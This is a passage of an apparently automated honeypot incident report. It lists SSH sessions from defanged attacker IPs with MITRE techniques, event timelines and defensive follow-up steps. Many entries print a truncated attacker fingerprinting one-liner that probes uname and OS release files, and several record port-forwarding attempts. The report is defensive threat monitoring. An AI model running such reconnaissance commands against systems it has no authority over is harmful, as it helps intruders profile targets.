| `2026-07-12 17:56:37` | `cowrie.client.kex` |
| `2026-07-12 17:56:39` | `cowrie.login.success` |
| `2026-07-12 17:56:40` | `cowrie.session.params` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:40` | `cowrie.command.success` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:40` | `cowrie.command.input` |
| `2026-07-12 17:56:41` | `cowrie.log.closed` |
| `2026-07-12 17:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7747ec751168

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:57 |
| **Last Seen** | 2026-07-12 17:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:57:06` | `cowrie.session.connect` |
| `2026-07-12 17:57:06` | `cowrie.client.version` |
| `2026-07-12 17:57:06` | `cowrie.client.kex` |
| `2026-07-12 17:57:06` | `cowrie.login.success` |
| `2026-07-12 17:57:08` | `cowrie.session.params` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.command.success` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.command.input` |
| `2026-07-12 17:57:08` | `cowrie.log.closed` |
| `2026-07-12 17:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-585e261ddd72

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:58 |
| **Last Seen** | 2026-07-12 17:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:58:09` | `cowrie.session.connect` |
| `2026-07-12 17:58:11` | `cowrie.client.version` |
| `2026-07-12 17:58:11` | `cowrie.client.kex` |
| `2026-07-12 17:58:14` | `cowrie.login.success` |
| `2026-07-12 17:58:15` | `cowrie.session.params` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:15` | `cowrie.command.success` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:15` | `cowrie.command.input` |
| `2026-07-12 17:58:16` | `cowrie.log.closed` |
| `2026-07-12 17:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa3d0a0b932d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:58 |
| **Last Seen** | 2026-07-12 17:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:58:29` | `cowrie.session.connect` |
| `2026-07-12 17:58:29` | `cowrie.client.version` |
| `2026-07-12 17:58:29` | `cowrie.client.kex` |
| `2026-07-12 17:58:31` | `cowrie.login.success` |
| `2026-07-12 17:58:33` | `cowrie.session.params` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.command.success` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.command.input` |
| `2026-07-12 17:58:33` | `cowrie.log.closed` |
| `2026-07-12 17:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab351dedec8

| Field | Detail |
|---|---|
| **Source IP** | `106.248.238[.]187` |
| **First Seen** | 2026-07-12 17:58 |
| **Last Seen** | 2026-07-12 17:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:58:39` | `cowrie.session.connect` |
| `2026-07-12 17:58:40` | `cowrie.client.version` |
| `2026-07-12 17:58:40` | `cowrie.client.kex` |
| `2026-07-12 17:58:42` | `cowrie.login.success` |
| `2026-07-12 17:58:43` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.248.238[.]187` to AbuseIPDB if not already reported
- [ ] Block `106.248.238[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-359e008b51b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:59 |
| **Last Seen** | 2026-07-12 17:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:59:30` | `cowrie.session.connect` |
| `2026-07-12 17:59:31` | `cowrie.client.version` |
| `2026-07-12 17:59:31` | `cowrie.client.kex` |
| `2026-07-12 17:59:31` | `cowrie.login.success` |
| `2026-07-12 17:59:32` | `cowrie.session.params` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:32` | `cowrie.command.success` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:32` | `cowrie.command.input` |
| `2026-07-12 17:59:33` | `cowrie.log.closed` |
| `2026-07-12 17:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72722a1a8471

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 18:00 |
| **Last Seen** | 2026-07-12 18:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:00:12` | `cowrie.session.connect` |
| `2026-07-12 18:00:13` | `cowrie.client.version` |
| `2026-07-12 18:00:13` | `cowrie.client.kex` |
| `2026-07-12 18:00:16` | `cowrie.login.success` |
| `2026-07-12 18:00:17` | `cowrie.session.params` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.command.success` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.command.input` |
| `2026-07-12 18:00:17` | `cowrie.log.closed` |
| `2026-07-12 18:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21a89015b435

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 18:00 |
| **Last Seen** | 2026-07-12 18:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:00:22` | `cowrie.session.connect` |
| `2026-07-12 18:00:22` | `cowrie.client.version` |
| `2026-07-12 18:00:22` | `cowrie.client.kex` |
| `2026-07-12 18:00:23` | `cowrie.login.success` |
| `2026-07-12 18:00:25` | `cowrie.session.params` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.command.success` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.command.input` |
| `2026-07-12 18:00:25` | `cowrie.log.closed` |
| `2026-07-12 18:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6b26042d01

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 18:01 |
| **Last Seen** | 2026-07-12 18:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:01:49` | `cowrie.session.connect` |
| `2026-07-12 18:01:49` | `cowrie.client.version` |
| `2026-07-12 18:01:49` | `cowrie.client.kex` |
| `2026-07-12 18:01:50` | `cowrie.login.success` |
| `2026-07-12 18:01:51` | `cowrie.session.params` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:51` | `cowrie.command.success` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:51` | `cowrie.command.input` |
| `2026-07-12 18:01:52` | `cowrie.log.closed` |
| `2026-07-12 18:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e014ec9a041

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]57` |
| **First Seen** | 2026-07-12 18:04 |
| **Last Seen** | 2026-07-12 18:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:04:08` | `cowrie.session.connect` |
| `2026-07-12 18:04:09` | `cowrie.client.version` |
| `2026-07-12 18:04:09` | `cowrie.client.kex` |
| `2026-07-12 18:04:10` | `cowrie.login.success` |
| `2026-07-12 18:04:11` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]57` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c725bf16a8c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 18:04 |
| **Last Seen** | 2026-07-12 18:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:04:12` | `cowrie.session.connect` |
| `2026-07-12 18:04:12` | `cowrie.client.version` |
| `2026-07-12 18:04:12` | `cowrie.client.kex` |
| `2026-07-12 18:04:13` | `cowrie.login.success` |
| `2026-07-12 18:04:14` | `cowrie.session.params` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.command.success` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.command.input` |
| `2026-07-12 18:04:14` | `cowrie.log.closed` |
| `2026-07-12 18:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9827d3c17f

| Field | Detail |
|---|---|
| **Source IP** | `211.23.109[.]116` |
| **First Seen** | 2026-07-12 18:04 |
| **Last Seen** | 2026-07-12 18:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:04:16` | `cowrie.session.connect` |
| `2026-07-12 18:04:17` | `cowrie.client.version` |
| `2026-07-12 18:04:17` | `cowrie.client.kex` |
| `2026-07-12 18:04:20` | `cowrie.login.success` |
| `2026-07-12 18:04:20` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.23.109[.]116` to AbuseIPDB if not already reported
- [ ] Block `211.23.109[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dabc4c61d4a6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-12 18:04 |
| **Last Seen** | 2026-07-12 18:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:04:41` | `cowrie.session.connect` |
| `2026-07-12 18:04:41` | `cowrie.client.version` |
| `2026-07-12 18:04:41` | `cowrie.client.kex` |
| `2026-07-12 18:04:42` | `cowrie.login.success` |
| `2026-07-12 18:04:42` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:04:42` | `cowrie.direct-tcpip.data` |
| `2026-07-12 18:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb00f56a3c4c

| Field | Detail |
|---|---|
| **Source IP** | `43.128.81[.]242` |
| **First Seen** | 2026-07-12 18:06 |
| **Last Seen** | 2026-07-12 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:06:33` | `cowrie.session.connect` |
| `2026-07-12 18:06:34` | `cowrie.telnet.option` |
| `2026-07-12 18:06:34` | `cowrie.telnet.option` |
| `2026-07-12 18:08:33` | `cowrie.login.success` |
| `2026-07-12 18:08:34` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `43.128.81[.]242` to AbuseIPDB if not already reported
- [ ] Block `43.128.81[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1436c8f642c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 18:06 |
| **Last Seen** | 2026-07-12 18:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:06:34` | `cowrie.session.connect` |
| `2026-07-12 18:06:34` | `cowrie.client.version` |
| `2026-07-12 18:06:34` | `cowrie.client.kex` |
| `2026-07-12 18:06:34` | `cowrie.login.success` |
| `2026-07-12 18:06:36` | `cowrie.session.params` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.command.success` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.command.input` |
| `2026-07-12 18:06:36` | `cowrie.log.closed` |
| `2026-07-12 18:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118ed07baacc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 18:07 |
| **Last Seen** | 2026-07-12 18:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:07:14` | `cowrie.session.connect` |
| `2026-07-12 18:07:14` | `cowrie.client.version` |
| `2026-07-12 18:07:14` | `cowrie.client.kex` |
| `2026-07-12 18:07:15` | `cowrie.login.success` |
| `2026-07-12 18:07:16` | `cowrie.session.params` |
| `2026-07-12 18:07:16` | `cowrie.command.input` |
| `2026-07-12 18:07:16` | `cowrie.log.closed` |
| `2026-07-12 18:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
